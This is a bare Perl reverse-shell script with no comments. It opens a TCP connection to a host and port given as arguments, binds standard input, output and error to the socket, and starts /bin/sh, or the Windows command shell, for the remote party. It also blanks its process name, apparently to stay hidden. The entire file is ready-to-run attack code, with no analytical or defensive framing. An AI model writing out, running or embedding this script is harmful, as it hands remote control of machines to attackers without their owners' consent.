#!/usr/bin/perl
use Socket;
$os = $^O;
$system="/bin/sh";
if($os =~ m/win/i){ $system="%COMSPEC% /K";}
$0=$cmd;
$target=$ARGV[1];
$port=$ARGV[0];
$iaddr=inet_aton($target) || die("error\n");
$paddr=sockaddr_in($port, $iaddr) || die("error\n");
$proto=getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("error\n");
connect(SOCKET, $paddr) || die("error\n");
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system($system);
close(STDIN);
close(STDOUT);
close(STDERR);
